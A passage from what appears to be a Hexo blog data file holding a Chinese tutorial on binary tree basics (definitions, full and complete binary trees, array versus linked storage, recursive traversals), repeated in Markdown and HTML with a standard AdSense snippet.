给定一组数据，比如1、3、5、6、9、10.你来算算，可以构建出多少种不同的二叉树？\n\n2.  我们讲了三种二叉树的遍历方式，前、中、后序。实际上，还有另外一种遍历方式，就是按层遍历，你知道如何实现吗？\n\n\n\n\n\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-二叉树基础（上）.md","raw":"---\ntitle: 算法-二叉树基础（上）：什么样的二叉树适合用数组来存储？\ndate: 2019-09-17 16:23:25\ntags:\ncategories:\n---\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n前面我们讲的都是线性表结构，栈、队列等等。今天我们将一种非线性表结构，树。树这种数据结构比线性表的数据结构要复杂的多，内容也比较多，分了四节来讲解。\n\n| 章节 | 内容 |\n|------|-----|\n| 二叉树（上） | 树、二叉树|\n| 二叉树（下） | 二叉查找树|\n| 红黑树      | 平衡二叉查找树、红黑树|\n| 递归树      | 递归树|\n\n\n在正式开始今天内容之前，我们还是先看一道思考题：二叉树有哪几种存储方式？什么样的二叉树适合用数组来存储？\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 树（Tree）\n{% endnote %}\n</div>\n\n我们首先来看，什么是树？再完备的定义，也不如图直观，我们可以从以下几颗树来看看，树这种数据结构有什么特征？\n\n{% asset_img 01.jpg %}\n\n你有没有发现，树这种数据结构很像我们现实生活中的“树”，这里面每个元素我们叫做“节点”，用来连线相邻节点之间的关系，我们叫做“父子关系”\n\n比如下面这幅图，A节点就是B节点的父节点，B节点是A节点的子节点。B、C、D这三个节点的父节点是同一个节点，所以他们之间互称为兄弟节点。我们把没有父节点的节点叫做根节点，也就是图中的节点E，我们把没有子节点的节点叫做叶子节点或者叶节点。比如途中的G、H、I、J、K、L都是叶子节点。\n\n{% asset_img 02.jpg %}\n\n除此之外，关于书，还有三个比较相似的概念：**高度**、**深度**、**层**。他们的定义是这样的：\n\n* 节点的高度= 节点到叶子节点的最长路径（边数）\n* 节点的深度 = 根节点到这个节点所经历的边的个数\n* 节点的层数 = 节点的深度 + 1\n* 树的高度 = 根节点的高度\n\n这三个概念的定义比较容易混淆，描述起来也比较空洞，我举个例子说明一个，你一看就应该能明白\n\n{% asset_img 03.jpg %}\n\n记住这几个概念，我还有一个小窍门，就是类比高度、深度、层这几个名次在我们生活中的意义。\n\n在我们的生活中，“高度”这个概念，其实就是从下往上度量，比如我们要度量第10层楼的高度、第13层楼的高度，起点都是地面。所以树这种数据结构的高度也是一样的，从最底层开始计算，并且计数的起点是0.\n\n\n“深度”这个概念在生活中是从上往下度量的，比如水中鱼的深度，是从海平面开始度量的，所以树这种数据结构的深度也是类似的，从根节点开始度量，并且计数起点是0.\n\n\n“层”跟深度的计算类似，不过，计算的起点是1，也就是说根节点位于第一层。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 二叉树（Binary Tree）\n{% endnote %}\n</div>\n\n树的机构多种多样，不过我们最常用的还是二叉树。\n\n二叉树，顾名思义，每个节点最多有两个“叉”，也就是两个子节点，分别是左子节点和右子节点。不过，二叉树并不要求每个节点都有两个子节点，有的节点只有左子节点，有的节点只有右子节点。我画的这几个都是二叉树，以此类推，你可以想象以下四叉树、八叉树是什么样子。\n\n{% asset_img 04.jpg %}\n\n这个图里面，有两个比较特殊的二叉树，分别是编号2和编号3的二叉树。\n\n其中，编号为2的二叉树中，叶子节点全都在最底层，除了叶子节点外，每个节点都有左右子节点，这种二叉树就叫做**满二叉树**。\n\n编号为3的二叉树中，叶子节点都在最下两层，最后一层的叶子节点都靠左排列，并且除了最后一层，其他层的节点个数都要达到最大，这种二叉树叫做**完全二叉树**。\n\n满二叉树很好理解，也很好识别，但是完全二叉树，有的人可能就分不清了。\n\n你可能会说，满二叉树的特征非常明显，我们把它单独拎出来，这个可以理解，但是完全二叉树的特征不怎么明显，但从长相上来看，完全二叉树并没有特殊的地方，更像是芸芸众树中的一种。\n\n那我们为什么还要特意把它拎出来呢？为什么偏偏把最后一层的叶子节点靠左排列的叫完全二叉树？如果靠右排列就不能叫完全二叉树了吗？这个定义的由来或者说目的在哪里？\n\n要理解完全二叉树的由来，我们需要先了解，**如何表示（或者存储）一颗二叉树**？\n\n想要存储一颗二叉树，我们有两种方法，一种是基于指针或者引用的二叉链式存储法，一种是基于数组的顺序存储法。\n\n我们先来看比较简单、直观的链式存储法。从图中你应该可以很清楚的看到，每个节点有三个字段，其中一个存储数据，另外两个指向左右子节点的指针。我们只要拎住根节点，就可以通过左右子节点的指针，把整颗树都串起来，这种存储方式我们比较常用。大部分二叉树的代码都是通过这种方式实现的。\n\n\n我们再来看，基于数组的**顺序存储法**，我们把根节点存储在下标i=1的位置，那左子节点存储在下标为2*i=2的位置，右子节点存储在2*i+1=3的位置。依次类推，B节点的左子节点存储在2*i=2*2=4的位置，右子节点存储在2*i+1=2*2+1=5的位置。\n\n我来总结一下，如果节点X存储在数组中下标为i的位置，下标为2*i的位置存储的就是左子节点，下标为2*1+1的位置存储的就是右子节点。反过来，下标为i/2的位置存储的就是它的父节点。通过这种方式，我们只要知道根节点存储的位置（一般情况下，为了方便计算子节点，根节点会存储在下标为1的位置），这样就可以通过下标计算，把整颗树都串起来。\n\n不过，我刚刚举的例子是一颗完全二叉树，所有仅仅“浪费”了一个下标为0的存储位置。如果是非完全二叉树，其实会浪费比较多的数组存储空间，你可以看我举的下面的例子。\n\n所以如果某棵二叉树是完全二叉树，那用数组存储无疑是最节省内存的一种方式。因为数组的存储方式并不需要像链式存储法那样，要存储额外的左右子节点的指针。这也是为什么完全二叉树要单独拎出来的原因，也是为什么完全二叉树要求最后一层的子节点都靠左的原因。\n\n当我们讲到堆和堆排序的时候，你会发现，堆其实就是一种完全二叉树，最常用的存储方式就是数组。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 二叉树的遍历\n{% endnote %}\n</div>\n\n前面我讲了二叉树的基本定义和存储方法，现在我们来看二叉树中非常重要的操作，二叉树的遍历。这也是非常常见的面试题。\n\n如何将所有节点都遍历打印出来呢？经典的方法有三种，**前序遍历、中序遍历、后序遍历**。其中，前、中、后序，表示的是节点与它的左右子树节点遍历打印的先后顺序。\n\n* 前序遍历是指，对于树中的任意节点来说，先打印这个节点，然后再打印它的左子树，最后打印它的右子树。\n\n* 中序遍历是指，对于树中的任意节点来说，先打印它的左子树节点，在打印它本身，最后打印它的右子树节点。\n\n* 后序遍历是指，对于树中的任意节点来说，先打印它的左子树节点，在打印它的右子树节点，最后打印这个节点本身。\n\n\n实际上，二叉树的前、中、后序遍历就是一个递归的过程。比如，前序遍历，其实就是先打印根节点，然后再递归地打印左子树，最后递归的打印右子树。\n\n写递归代码的关键，就是看能不能写出递推公式，而写递推公式的关键，就是要看解决问题A，就假设子问题B、C已经解决，然后再来看如何利用B、C来解决A。所以，我们可以把前、中、后序遍历的递推公式都写出来。\n\n```\n前序遍历的递推公式\npreOrder(r) = print r -> preOrder(r->left) -> preOrder(r->right)\n\n中序遍历的递推公式\ninOrder(r) = inOrder(r->left) -> print r -> inOrder(r->right)\n\n后序遍历的递推公式\npostOrder(r) = postOrder(r->left) -> postOrder(r->right) -> print r\n\n```\n\n有了递推公式，代码写起来就简单多了，这三种遍历方式的代码，我都写出来了，你可以看看。\n\n```\nvoid preOrder(Node* root) {\n    if (root == null) return;\n\n    print root; // 伪代码，表示打印root节点\n    preOrder(root->left)\n    preOrder(root->right)\n}\n\nvoid inOrder(Node* root) {\n    if(root == null) return;\n    inOrder(root->left);\n    print  root;\n    inOrder(root->right)\n}\n\nvoid postOrder(Node* root) {\n    if(root == null) return;\n    postOrder(root->left);\n    postOrder(root->right)\n    print root;\n}\n```\n\n二叉树的前、中、后序遍历是不是很简单？你知道二叉树遍历的时间复杂度是多少吗？我们一起来看看。\n\n\n从我前面画的前、中、后序遍历的顺序图，可以看出来，每个节点最多被访问两次，所以遍历的时间复杂度，跟节点的个数n成正比，也就是说二叉树的遍历的时间复杂度是O(n).\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 解答开篇|内容小姐\n{% endnote %}\n</div>\n\n今天，讲了一种非线性表数据结构，树。关于树，有几个比较常用的概念你需要掌握，那就是跟节点、叶子节点、父节点、子节点、兄弟节点，还有节点的高度、深度、层数，以及树的高度。\n\n我们平时最常用的就是二叉树。二叉树的每个节点最多有两个子节点，分别是左子节点和右子节点。二叉树中，有两个比较特殊的树，满二叉树和完全二叉树。满二叉树是完全二叉树的一中特殊情况。\n\n二叉树既可以用链式存储，也可以用数组顺序存储。数组顺序存储的方式比较适合完全二叉树，其他类型的二叉树用数组存储会比较浪费存储空间。除此之外，二叉树里非常重要的操作就是前、中、后序遍历操作，遍历的操作时间复杂度是O(n)，你需要理解并能用递归代码来实现，\n\n### 课后思考\n\n1. 给定一组数据，比如1、3、5、6、9、10.你来算算，可以构建出多少种不同的二叉树？\n\n2.  我们讲了三种二叉树的遍历方式，前、中、后序。实际上，还有另外一种遍历方式，就是按层遍历，你知道如何实现吗？\n\n\n\n\n\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-二叉树基础（上）","published":1,"updated":"2019-09-18T02:08:15.620Z","_id":"ck0oko2mm004no25tt8yuocrd","comments":1,"layout":"post","photos":[],"link":"","content":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>前面我们讲的都是线性表结构，栈、队列等等。今天我们将一种非线性表结构，树。树这种数据结构比线性表的数据结构要复杂的多，内容也比较多，分了四节来讲解。</p>\n<table>\n<thead>\n<tr>\n<th>章节</th>\n<th>内容</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>二叉树（上）</td>\n<td>树、二叉树</td>\n</tr>\n<tr>\n<td>二叉树（下）</td>\n<td>二叉查找树</td>\n</tr>\n<tr>\n<td>红黑树</td>\n<td>平衡二叉查找树、红黑树</td>\n</tr>\n<tr>\n<td>递归树</td>\n<td>递归树</td>\n</tr>\n</tbody>\n</table>\n<p>在正式开始今天内容之前，我们还是先看一道思考题：二叉树有哪几种存储方式？什么样的二叉树适合用数组来存储？</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"树（Tree）\"><a href=\"#树（Tree）\" class=\"headerlink\" title=\"树（Tree）\"></a>树（Tree）</h3></div><br></div>\n\n<p>我们首先来看，什么是树？再完备的定义，也不如图直观，我们可以从以下几颗树来看看，树这种数据结构有什么特征？</p>\n<img src=\"/posts/2019-09-17-算法-二叉树基础（上）/01.jpg\">\n<p>你有没有发现，树这种数据结构很像我们现实生活中的“树”，这里面每个元素我们叫做“节点”，用来连线相邻节点之间的关系，我们叫做“父子关系”</p>\n<p>比如下面这幅图，A节点就是B节点的父节点，B节点是A节点的子节点。B、C、D这三个节点的父节点是同一个节点，所以他们之间互称为兄弟节点。我们把没有父节点的节点叫做根节点，也就是图中的节点E，我们把没有子节点的节点叫做叶子节点或者叶节点。比如途中的G、H、I、J、K、L都是叶子节点。</p>\n<img src=\"/posts/2019-09-17-算法-二叉树基础（上）/02.jpg\">\n<p>除此之外，关于书，还有三个比较相似的概念：<strong>高度</strong>、<strong>深度</strong>、<strong>层</strong>。他们的定义是这样的：</p>\n<ul>\n<li>节点的高度= 节点到叶子节点的最长路径（边数）</li>\n<li>节点的深度 = 根节点到这个节点所经历的边的个数</li>\n<li>节点的层数 = 节点的深度 + 1</li>\n<li>树的高度 = 根节点的高度</li>\n</ul>\n<p>这三个概念的定义比较容易混淆，描述起来也比较空洞，我举个例子说明一个，你一看就应该能明白</p>\n<img src=\"/posts/2019-09-17-算法-二叉树基础（上）/03.jpg\">\n<p>记住这几个概念，我还有一个小窍门，就是类比高度、深度、层这几个名次在我们生活中的意义。</p>\n<p>在我们的生活中，“高度”这个概念，其实就是从下往上度量，比如我们要度量第10层楼的高度、第13层楼的高度，起点都是地面。所以树这种数据结构的高度也是一样的，从最底层开始计算，并且计数的起点是0.</p>\n<p>“深度”这个概念在生活中是从上往下度量的，比如水中鱼的深度，是从海平面开始度量的，所以树这种数据结构的深度也是类似的，从根节点开始度量，并且计数起点是0.</p>\n<p>“层”跟深度的计算类似，不过，计算的起点是1，也就是说根节点位于第一层。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"二叉树（Binary-Tree）\"><a href=\"#二叉树（Binary-Tree）\" class=\"headerlink\" title=\"二叉树（Binary Tree）\"></a>二叉树（Binary Tree）</h3></div><br></div>\n\n<p>树的机构多种多样，不过我们最常用的还是二叉树。</p>\n<p>二叉树，顾名思义，每个节点最多有两个“叉”，也就是两个子节点，分别是左子节点和右子节点。不过，二叉树并不要求每个节点都有两个子节点，有的节点只有左子节点，有的节点只有右子节点。我画的这几个都是二叉树，以此类推，你可以想象以下四叉树、八叉树是什么样子。</p>\n<img src=\"/posts/2019-09-17-算法-二叉树基础（上）/04.jpg\">\n<p>这个图里面，有两个比较特殊的二叉树，分别是编号2和编号3的二叉树。</p>\n<p>其中，编号为2的二叉树中，叶子节点全都在最底层，除了叶子节点外，每个节点都有左右子节点，这种二叉树就叫做<strong>满二叉树</strong>。</p>\n<p>编号为3的二叉树中，叶子节点都在最下两层，最后一层的叶子节点都靠左排列，并且除了最后一层，其他层的节点个数都要达到最大，这种二叉树叫做<strong>完全二叉树</strong>。</p>\n<p>满二叉树很好理解，也很好识别，但是完全二叉树，有的人可能就分不清了。</p>\n<p>你可能会说，满二叉树的特征非常明显，我们把它单独拎出来，这个可以理解，但是完全二叉树的特征不怎么明显，但从长相上来看，完全二叉树并没有特殊的地方，更像是芸芸众树中的一种。</p>\n<p>那我们为什么还要特意把它拎出来呢？为什么偏偏把最后一层的叶子节点靠左排列的叫完全二叉树？如果靠右排列就不能叫完全二叉树了吗？这个定义的由来或者说目的在哪里？</p>\n<p>要理解完全二叉树的由来，我们需要先了解，<strong>如何表示（或者存储）一颗二叉树</strong>？</p>\n<p>想要存储一颗二叉树，我们有两种方法，一种是基于指针或者引用的二叉链式存储法，一种是基于数组的顺序存储法。</p>\n<p>我们先来看比较简单、直观的链式存储法。从图中你应该可以很清楚的看到，每个节点有三个字段，其中一个存储数据，另外两个指向左右子节点的指针。我们只要拎住根节点，就可以通过左右子节点的指针，把整颗树都串起来，这种存储方式我们比较常用。大部分二叉树的代码都是通过这种方式实现的。</p>\n<p>我们再来看，基于数组的<strong>顺序存储法</strong>，我们把根节点存储在下标i=1的位置，那左子节点存储在下标为2<em>i=2的位置，右子节点存储在2</em>i+1=3的位置。依次类推，B节点的左子节点存储在2<em>i=2</em>2=4的位置，右子节点存储在2<em>i+1=2</em>2+1=5的位置。</p>\n<p>我来总结一下，如果节点X存储在数组中下标为i的位置，下标为2<em>i的位置存储的就是左子节点，下标为2</em>1+1的位置存储的就是右子节点。反过来，下标为i/2的位置存储的就是它的父节点。通过这种方式，我们只要知道根节点存储的位置（一般情况下，为了方便计算子节点，根节点会存储在下标为1的位置），这样就可以通过下标计算，把整颗树都串起来。</p>\n<p>不过，我刚刚举的例子是一颗完全二叉树，所有仅仅“浪费”了一个下标为0的存储位置。如果是非完全二叉树，其实会浪费比较多的数组存储空间，你可以看我举的下面的例子。</p>\n<p>所以如果某棵二叉树是完全二叉树，那用数组存储无疑是最节省内存的一种方式。因为数组的存储方式并不需要像链式存储法那样，要存储额外的左右子节点的指针。这也是为什么完全二叉树要单独拎出来的原因，也是为什么完全二叉树要求最后一层的子节点都靠左的原因。</p>\n<p>当我们讲到堆和堆排序的时候，你会发现，堆其实就是一种完全二叉树，最常用的存储方式就是数组。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"二叉树的遍历\"><a href=\"#二叉树的遍历\" class=\"headerlink\" title=\"二叉树的遍历\"></a>二叉树的遍历</h3></div><br></div>\n\n<p>前面我讲了二叉树的基本定义和存储方法，现在我们来看二叉树中非常重要的操作，二叉树的遍历。这也是非常常见的面试题。</p>\n<p>如何将所有节点都遍历打印出来呢？经典的方法有三种，<strong>前序遍历、中序遍历、后序遍历</strong>。其中，前、中、后序，表示的是节点与它的左右子树节点遍历打印的先后顺序。</p>\n<ul>\n<li><p>前序遍历是指，对于树中的任意节点来说，先打印这个节点，然后再打印它的左子树，最后打印它的右子树。</p>\n</li>\n<li><p>中序遍历是指，对于树中的任意节点来说，先打印它的左子树节点，在打印它本身，最后打印它的右子树节点。</p>\n</li>\n<li><p>后序遍历是指，对于树中的任意节点来说，先打印它的左子树节点，在打印它的右子树节点，最后打印这个节点本身。</p>\n</li>\n</ul>\n<p>实际上，二叉树的前、中、后序遍历就是一个递归的过程。比如，前序遍历，其实就是先打印根节点，然后再递归地打印左子树，最后递归的打印右子树。</p>\n<p>写递归代码的关键，就是看能不能写出递推公式，而写递推公式的关键，就是要看解决问题A，就假设子问题B、C已经解决，然后再来看如何利用B、C来解决A。所以，我们可以把前、中、后序遍历的递推公式都写出来。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">前序遍历的递推公式</span><br><span class=\"line\">preOrder(r) = print r -&gt; preOrder(r-&gt;left) -&gt; preOrder(r-&gt;right)</span><br><span class=\"line\"></span><br><span class=\"line\">中序遍历的递推公式</span><br><span class=\"line\">inOrder(r) = inOrder(r-&gt;left) -&gt; print r -&gt; inOrder(r-&gt;right)</span><br><span class=\"line\"></span><br><span class=\"line\">后序遍历的递推公式</span><br><span class=\"line\">postOrder(r) = postOrder(r-&gt;left) -&gt; postOrder(r-&gt;right) -&gt; print r</span><br></pre></td></tr></table></figure>\n<p>有了递推公式，代码写起来就简单多了，这三种遍历方式的代码，我都写出来了，你可以看看。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">void preOrder(Node* root) &#123;</span><br><span class=\"line\">    if (root == null) return;</span><br><span class=\"line\"></span><br><span class=\"line\">    print root; // 伪代码，表示打印root节点</span><br><span class=\"line\">    preOrder(root-&gt;left)</span><br><span class=\"line\">    preOrder(root-&gt;right)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void inOrder(Node* root) &#123;</span><br><span class=\"line\">    if(root == null) return;</span><br><span class=\"line\">    inOrder(root-&gt;left);</span><br><span class=\"line\">    print  root;</span><br><span class=\"line\">    inOrder(root-&gt;right)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void postOrder(Node* root) &#123;</span><br><span class=\"line\">    if(root == null) return;</span><br><span class=\"line\">    postOrder(root-&gt;left);</span><br><span class=\"line\">    postOrder(root-&gt;right)</span><br><span class=\"line\">    print root;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>二叉树的前、中、后序遍历是不是很简单？你知道二叉树遍历的时间复杂度是多少吗？我们一起来看看。</p>\n<p>从我前面画的前、中、后序遍历的顺序图，可以看出来，每个节点最多被访问两次，所以遍历的时间复杂度，跟节点的个数n成正比，也就是说二叉树的遍历的时间复杂度是O(n).</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"解答开篇-内容小姐\"><a href=\"#解答开篇-内容小姐\" class=\"headerlink\" title=\"解答开篇|内容小姐\"></a>解答开篇|内容小姐</h3></div><br></div>\n\n<p>今天，讲了一种非线性表数据结构，树。关于树，有几个比较常用的概念你需要掌握，那就是跟节点、叶子节点、父节点、子节点、兄弟节点，还有节点的高度、深度、层数，以及树的高度。</p>\n<p>我们平时最常用的就是二叉树。二叉树的每个节点最多有两个子节点，分别是左子节点和右子节点。二叉树中，有两个比较特殊的树，满二叉树和完全二叉树。满二叉树是完全二叉树的一中特殊情况。</p>\n<p>二叉树既可以用链式存储，也可以用数组顺序存储。数组顺序存储的方式比较适合完全二叉树，其他类型的二叉树用数组存储会比较浪费存储空间。除此之外，二叉树里非常重要的操作就是前、中、后序遍历操作，遍历的操作时间复杂度是O(n)，你需要理解并能用递归代码来实现，</p>\n<h3 id=\"课后思考\"><a href=\"#课后思考\" class=\"headerlink\" title=\"课后思考\"></a>课后思考</h3><ol>\n<li><p>给定一组数据，比如1、3、5、6、9、10.你来算算，可以构建出多少种不同的二叉树？</p>\n</li>\n<li><p>我们讲了三种二叉树的遍历方式，前、中、后序。实际上，还有另外一种遍历方式，就是按层遍历，你知道如何实现吗？</p>\n</li>\n</ol>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>前面我们讲的都是线性表结构，栈、队列等等。今天我们将一种非线性表结构，树。树这种数据结构比线性表的数据结构要复杂的多，内容也比较多，分了四节来讲解。</p>\n<table>\n<thead>\n<tr>\n<th>章节</th>\n<th>内容</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>二叉树（上）</td>\n<td>树、二叉树</td>\n</tr>\n<tr>\n<td>二叉树（下）</td>\n<td>二叉查找树</td>\n</tr>\n<tr>\n<td>红黑树</td>\n<td>平衡二叉查找树、红黑树</td>\n</tr>\n<tr>\n<td>递归树</td>\n<td>递归树</td>\n</tr>\n</tbody>\n</table>\n<p>在正式开始今天内容之前，我们还是先看一道思考题：二叉树有哪几种存储方式？什么样的二叉树适合用数组来存储？</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"树（Tree）\"><a href=\"#树（Tree）\" class=\"headerlink\" title=\"树（Tree）\"></a>树（Tree）</h3></div><br></div>\n\n<p>我们首先来看，什么是树？再完备的定义，也不如图直观，我们可以从以下几颗树来看看，树这种数据结构有什么特征？</p>\n<img src=\"/posts/2019-09-17-算法-二叉树基础（上）/01.jpg\">\n<p>你有没有发现，树这种数据结构很像我们现实生活中的“树”，这里面每个元素我们叫做“节点”，用来连线相邻节点之间的关系，我们叫做“父子关系”</p>\n<p>比如下面这幅图，A节点就是B节点的父节点，B节点是A节点的子节点。B、C、D这三个节点的父节点是同一个节点，所以他们之间互称为兄弟节点。我们把没有父节点的节点叫做根节点，也就是图中的节点E，我们把没有子节点的节点叫做叶子节点或者叶节点。比如途中的G、H、I、J、K、L都是叶子节点。</p>\n<img src=\"/posts/2019-09-17-算法-二叉树基础（上）/02.jpg\">\n<p>除此之外，关于书，还有三个比较相似的概念：<strong>高度</strong>、<strong>深度</strong>、<strong>层</strong>。他们的定义是这样的：</p>\n<ul>\n<li>节点的高度= 节点到叶子节点的最长路径（边数）</li>\n<li>节点的深度 = 根节点到这个节点所经历的边的个数</li>\n<li>节点的层数 = 节点的深度 + 1</li>\n<li>树的高度 = 根节点的高度</li>\n</ul>\n<p>这三个概念的定义比较容易混淆，描述起来也比较空洞，我举个例子说明一个，你一看就应该能明白</p>\n<img src=\"/posts/2019-09-17-算法-二叉树基础（上）/03.jpg\">\n<p>记住这几个概念，我还有一个小窍门，就是类比高度、深度、层这几个名次在我们生活中的意义。</p>\n<p>在我们的生活中，“高度”这个概念，其实就是从下往上度量，比如我们要度量第10层楼的高度、第13层楼的高度，起点都是地面。所以树这种数据结构的高度也是一样的，从最底层开始计算，并且计数的起点是0.</p>\n<p>“深度”这个概念在生活中是从上往下度量的，比如水中鱼的深度，是从海平面开始度量的，所以树这种数据结构的深度也是类似的，从根节点开始度量，并且计数起点是0.</p>\n<p>“层”跟深度的计算类似，不过，计算的起点是1，也就是说根节点位于第一层。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"二叉树（Binary-Tree）\"><a href=\"#二叉树（Binary-Tree）\" class=\"headerlink\" title=\"二叉树（Binary Tree）\"></a>二叉树（Binary Tree）</h3></div><br></div>\n\n<p>树的机构多种多样，不过我们最常用的还是二叉树。</p>\n<p>二叉树，顾名思义，每个节点最多有两个“叉”，也就是两个子节点，分别是左子节点和右子节点。不过，二叉树并不要求每个节点都有两个子节点，有的节点只有左子节点，有的节点只有右子节点。我画的这几个都是二叉树，以此类推，你可以想象以下四叉树、八叉树是什么样子。</p>\n<img src=\"/posts/2019-09-17-算法-二叉树基础（上）/04.jpg\">\n<p>这个图里面，有两个比较特殊的二叉树，分别是编号2和编号3的二叉树。</p>\n<p>其中，编号为2的二叉树中，叶子节点全都在最底层，除了叶子节点外，每个节点都有左右子节点，这种二叉树就叫做<strong>满二叉树</strong>。</p>\n<p>编号为3的二叉树中，叶子节点都在最下两层，最后一层的叶子节点都靠左排列，并且除了最后一层，其他层的节点个数都要达到最大，这种二叉树叫做<strong>完全二叉树</strong>。</p>\n<p>满二叉树很好理解，也很好识别，但是完全二叉树，有的人可能就分不清了。</p>\n<p>你可能会说，满二叉树的特征非常明显，我们把它单独拎出来，这个可以理解，但是完全二叉树的特征不怎么明显，但从长相上来看，完全二叉树并没有特殊的地方，更像是芸芸众树中的一种。</p>\n<p>那我们为什么还要特意把它拎出来呢？为什么偏偏把最后一层的叶子节点靠左排列的叫完全二叉树？如果靠右排列就不能叫完全二叉树了吗？这个定义的由来或者说目的在哪里？</p>\n<p>要理解完全二叉树的由来，我们需要先了解，<strong>如何表示（或者存储）一颗二叉树</strong>？</p>\n<p>想要存储一颗二叉树，我们有两种方法，一种是基于指针或者引用的二叉链式存储法，一种是基于数组的顺序存储法。</p>\n<p>我们先来看比较简单、直观的链式存储法。从图中你应该可以很清楚的看到，每个节点有三个字段，其中一个存储数据，另外两个指向左右子节点的指针。我们只要拎住根节点，就可以通过左右子节点的指针，把整颗树都串起来，这种存储方式我们比较常用。大部分二叉树的代码都是通过这种方式实现的。</p>\n<p>我们再来看，基于数组的<strong>顺序存储法</strong>，我们把根节点存储在下标i=1的位置，那左子节点存储在下标为2<em>i=2的位置，右子节点存储在2</em>i+1=3的位置。依次类推，B节点的左子节点存储在2<em>i=2</em>2=4的位置，右子节点存储在2<em>i+1=2</em>2+1=5的位置。</p>\n<p>我来总结一下，如果节点X存储在数组中下标为i的位置，下标为2<em>i的位置存储的就是左子节点，下标为2</em>1+1的位置存储的就是右子节点。反过来，下标为i/2的位置存储的就是它的父节点。通过这种方式，我们只要知道根节点存储的位置（一般情况下，为了方便计算子节点，根节点会存储在下标为1的位置），这样就可以通过下标计算，把整颗树都串起来。</p>\n<p>不过，我刚刚举的例子是一颗完全二叉树，所有仅仅“浪费”了一个下标为0的存储位置。如果是非完全二叉树，其实会浪费比较多的数组存储空间，你可以看我举的下面的例子。</p>\n<p>所以如果某棵二叉树是完全二叉树，那用数组存储无疑是最节省内存的一种方式。因为数组的存储方式并不需要像链式存储法那样，要存储额外的左右子节点的指针。这也是为什么完全二叉树要单独拎出来的原因，也是为什么完全二叉树要求最后一层的子节点都靠左的原因。</p>\n<p>当我们讲到堆和堆排序的时候，你会发现，堆其实就是一种完全二叉树，最常用的存储方式就是数组。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"二叉树的遍历\"><a href=\"#二叉树的遍历\" class=\"headerlink\" 